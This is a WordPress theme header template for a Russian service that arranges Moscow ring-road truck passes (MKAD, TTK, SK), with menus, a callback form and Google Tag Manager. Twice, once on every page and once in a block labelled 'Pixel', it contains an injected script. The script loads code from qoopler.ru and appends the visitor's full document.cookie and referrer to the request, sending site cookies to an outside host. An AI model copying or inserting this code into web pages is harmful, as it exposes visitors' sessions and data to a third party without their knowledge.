<!DOCTYPE html>
<html lang="ru">
<head>
	<meta name="cmsmagazine" content="f7245597f5b3579a3db3d69ddef2a8bf" />
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="yandex-verification" content="0a2d7716ecc3bfe9" />
	<meta name="google-site-verification" content="puHwXu1keED1FYLZrl4GJSN2FZLT6eBFkIfOgStAfg0" />
	<!-- Google Tag Manager -->
	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-M477CF5');</script>
<!-- End Google Tag Manager -->
<title><?php wp_title(); ?></title>

<link rel="shortcut icon" href="<?php bloginfo("template_url");?>/img/icon.png" type="image/x-icon">
<link rel="icon" href="<?php bloginfo("template_url");?>/img/icon.png" type="image/x-icon">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fira+Sans:400,500,700">

<script src="https://www.google.com/recaptcha/api.js?render=6LdXHxAkAAAAAPXMSVztj9kjlRKVtNYbQrdK7k5u"></script>

<?php wp_head(); ?>
</head>

<script type="text/javascript">
    (function (d, w) {
        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
                s.type = "text/javascript";
                s.async = true;
                s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);

                if (w.opera == "[object Opera]") {
                    d.addEventListener("DOMContentLoaded", f, false);
                } else { f(); }
    })(document, window);
</script>

<body>
    <?
        if (is_home() || is_page(444) || is_page(7) || is_page(9) || is_page(5)) {
    ?>
        <!-- Pixel -->
            <script type="text/javascript">
                (function (d, w) {
                    var n = d.getElementsByTagName("script")[0],
                        s = d.createElement("script"),
                        f = function () { n.parentNode.insertBefore(s, n); };
                            s.type = "text/javascript";
                            s.async = true;
                            s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);
            
                            if (w.opera == "[object Opera]") {
                                d.addEventListener("DOMContentLoaded", f, false);
                            } else { f(); }
                })(document, window);
            </script>
        <!-- /Pixel -->
    <?
        }
    ?>
	
	<script>
		var timer_str = "<?php echo file_get_contents('date.txt', FILE_USE_INCLUDE_PATH); ?>";
	</script>
	<!-- Google Tag Manager (noscript) -->
	<noscript><iframe src=""https://www.googletagmanager.com/ns.html?id=GTM-M477CF5""
		height=""0"" width=""0"" style=""display:none;visibility:hidden""></iframe></noscript>
		<!-- End Google Tag Manager (noscript) -->
		<?php include("arcticWin.php");?>
		<?php get_template_part('/template-parts/modals');?>

		<header class="header">
			<div class="header__inner container">
				<?php if(!is_home() || !is_front_page()):?>
				<a href="<?php echo home_url('/')?>" class="logo-link">
				<?php endif;?>
				<div class="header__logo">
					<span class="header__logo-caption">Пропуска МКАД ТТК СК</span>
					<span class="header__logo-info">
						<div alt="logotype" class="header__logo-info-img"></div>
						<span class="header__logo-info-desc">Профессиональная помощь в оформлении с 2014 года</span>
					</span>
				</div>
				<?php if(!is_home() || !is_front_page()):?>
			</a>
		<?php endif;?>
		<div class="header__menu">
			<div class="menu-toggle js-menu-toggle" onclick="menuToggle(this, '.js-menu')">
				<i class="menu-toggle__element"></i>
				<i class="menu-toggle__element"></i>
				<i class="menu-toggle__element"></i>
			</div>
			<div class="header__menu-inner js-menu">
				<ul class="header__menu-container">
					<!-- <li class="header__menu-item"><a href="<?php echo get_permalink(24)?>" class="header__menu-link">Дополнительные услуги</a></li> -->
					<li class="header__menu-item"><a href="<?php echo get_permalink(16)?>" class="header__menu-link">О нас</a></li>
					<li class="header__menu-item"><a href="<?php echo get_permalink(51)?>" class="header__menu-link">Контакты</a></li>
				</ul>
				<ul class="intro__navbar-container">
					<li class="intro__navbar-item"><a href="<?php echo get_permalink(5)?>" class="intro__navbar-link action-btn">Пропуск на мкад</a></li>
					<li class="intro__navbar-item"><a href="<?php echo get_permalink(7)?>" class="intro__navbar-link action-btn">Пропуск ттк</a></li>
					<li class="intro__navbar-item"><a href="<?php echo get_permalink(9)?>" class="intro__navbar-link action-btn">Пропуск ск</a></li>
					<li class="intro__navbar-item"><a href="<?php echo get_permalink(12)?>" class="intro__navbar-link action-btn active">Проверить пропуск по номеру</a></li>
					<li class="intro__navbar-item"><a href="<?php echo get_permalink(14)?>" class="intro__navbar-link action-btn">Проверить штрафы</a></li>
				</ul>
			</div>
		</div>
	</div>
</header> <!-- /.header -->




<!-- Арктик модал -->
<div style="display: none;">
	<div class="box-modal" id="messgeModal">
		<div class="box-modal_close arcticmodal-close">закрыть</div>
		<div class = "modalline" id = "lineIcon">
		</div>
		
		<div class = "modalline" id = "lineMsg">
		</div>
	</div>
</div>
<div style="display: none;">
	<div class="box-modal" id="check-modal">
		<div class="box-modal_close arcticmodal-close">закрыть</div>
		<div class = "modalline" id = "lineIcon">
			<form action="" class="form__container" id = "probform">
				<div class="form__fields">
					<input type="text" name="name" class="form__fields-item uniFormName" placeholder="Напишите ваше имя" required autocomplete="off">
					<input type="tel" name="phone_number" class="form__fields-item mascedtel uniFormTel" placeholder="Введите номер телефона" required autocomplete="off">
				</div>
				<div class="form__action">
					<div class="form__action-btn action-btn uniSendBtn"  data-formid = "probform" data-mailmsg = "Заявка с баннера Помощь в оформлении пропусков в Москву">Заказать звонок</div>
				</div>
			</form>
		</div>
		
		<div class = "modalline" id = "lineMsg">
		</div>
	</div>
</div>


<!-- Меню -->
<?php //$options = get_option( "wpuniq_theme_options" ); ?>
<?php //wp_nav_menu( array('menu' => 'Главное меню', 'container' => false )); ?>